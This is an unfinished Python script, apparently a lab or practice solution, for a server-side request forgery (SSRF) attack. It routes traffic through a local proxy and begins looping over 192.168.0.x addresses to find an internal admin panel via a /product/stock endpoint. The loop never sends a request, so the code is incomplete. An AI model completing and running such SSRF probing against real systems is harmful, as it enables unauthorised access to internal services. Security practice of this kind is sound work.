
#
# basic SSRF against another backend system
# 


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}

def main():
  # validation to teach the user how to execute a python script if it is not providing two parameters: python3 script_name
  if len(sys.argv) !=2:
    print("(+) Usage: %s <url>" % sys.argv[0])
    print("(+) Example: %s machetevault.com" % sys.argv[0])

  url = sys.argv[1]
  print("(+) Finding admin hostname...")
  admin_hostname = check_admin_hostname(url)

def check_admin_hostname(url):
  check_stock_path = "/product/stock"
  admin_hostname = ''
  for i in range(1,256):
    hostname = 'http://192.168.0.%s:8080/admin'


if __name__ == "__main__":
  main()
